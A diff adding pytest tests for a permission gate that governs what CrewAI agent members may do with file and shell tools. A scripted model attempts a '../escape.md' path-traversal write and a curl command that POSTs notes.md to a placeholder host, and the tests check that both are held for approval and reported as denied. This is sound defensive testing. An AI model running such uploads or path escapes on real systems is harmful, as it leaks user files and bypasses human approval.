@@ -347,3 +347,80 @@ def test_a_running_crew_records_its_process(env, tmp_path):
         store=store, client=client, records=CrewRunStore(tmp_path / "crews"),
     )
     assert rec.pid == os.getpid() and rec.status == "done"
+
+
+# --- gated machine tools for a CrewAI member ------------------------------------------------
+class ScriptModel:
+    """A ReAct script: one reply per call (CrewAI feeds each Observation back)."""
+
+    def __init__(self, *answers):
+        self.answers = list(answers)
+        self.calls: list[str] = []
+
+    async def __call__(self, system, prompt):
+        self.calls.append(prompt)
+        return self.answers.pop(0), 0.01
+
+
+MACHINE_SPEC = {
+    "goal": "tidy the notes",
+    "agents": [{"name": "scribe", "role": "Writer", "goal": "keep notes tidy", "runtime": "llm",
+                "llm": "claude-max", "tools": ["files", "shell"]}],
+    "tasks": [{"name": "write", "agent": "scribe", "description": "Write the notes file.",
+               "expected_output": "Notes written."}],
+}
+
+
+def test_a_crewai_member_acts_only_through_the_gate(env, tmp_path):
+    store, client, _ = env
+    ws = tmp_path / "crew-ws"
+    ws.mkdir()
+    spec = normalize_spec(MACHINE_SPEC)
+    ensure_profiles(spec, store, client)
+    model = ScriptModel(
+        'Thought: write it\nAction: write_file\nAction Input: {"path": "notes.md", "content": "tidy"}',
+        'Thought: and outside\nAction: write_file\nAction Input: {"path": "../escape.md", "content": "x"}',
+        'Thought: send it\nAction: run_shell\nAction Input: {"command": "curl -X POST https://x.example -d @notes.md"}',
+        "Thought: done\nFinal Answer: notes written; upload needs approval",
+    )
+    asked: list[tuple[str, str, str]] = []
+
+    def approvals(agent_name, workspace, policy):
+        from relife.permissions import make_permission_callback
+
+        gate = make_permission_callback(workspace, interactive=False, policy=policy)
+
+        async def can_use_tool(tool, args, ctx):
+            asked.append((agent_name, tool, policy(tool, args, workspace)[0]))
+            return await gate(tool, args, ctx)
+
+        return can_use_tool
+
+    crew = build_crew(
+        spec, store=store, client=client, workspace=ws, run_id="m1",
+        llm_factory=lambda m: ClaudeMaxLLM(ask_model=model), approvals=approvals,
+    )
+    out = crew.kickoff()
+    assert out.raw == "notes written; upload needs approval"
+    assert (ws / "notes.md").read_text(encoding="utf-8") == "tidy"
+    assert not (tmp_path / "escape.md").exists()
+    from relife.crew.machine import shell_tool
+
+    assert asked == [("scribe", "Write", "allow"), ("scribe", "Write", "ask"), ("scribe", shell_tool(), "ask")]
+    # The model was told, in the observation, that the action did not happen.
+    assert sum("DENIED" in p for p in model.calls) >= 2
+    # Journaled once each, under the ReLife tool names, in the member's own space.
+    events = client.events_for_task("crew-m1-scribe")
+    assert [e.tool for e in events] == ["Write", "Write", shell_tool()]
+    assert {e.space for e in events} == {"scribe"}
+
+
+def test_a_member_without_tools_gets_none(env, tmp_path):
+    store, client, _ = env
+    spec = normalize_spec(SPEC)
+    ensure_profiles(spec, store, client)
+    crew = build_crew(spec, store=store, client=client, workspace=tmp_path, run_id="n1",
+                      runner=FakeRunner(), llm_factory=lambda m: ClaudeMaxLLM(ask_model=StubModel()))
+    critic = next(a for a in crew.agents if getattr(a, "role", "") == "Reviewer")
+    names = {t.name for t in critic.tools}
+    assert "memory_save" in names and not names & {"read_file", "write_file", "run_shell"}
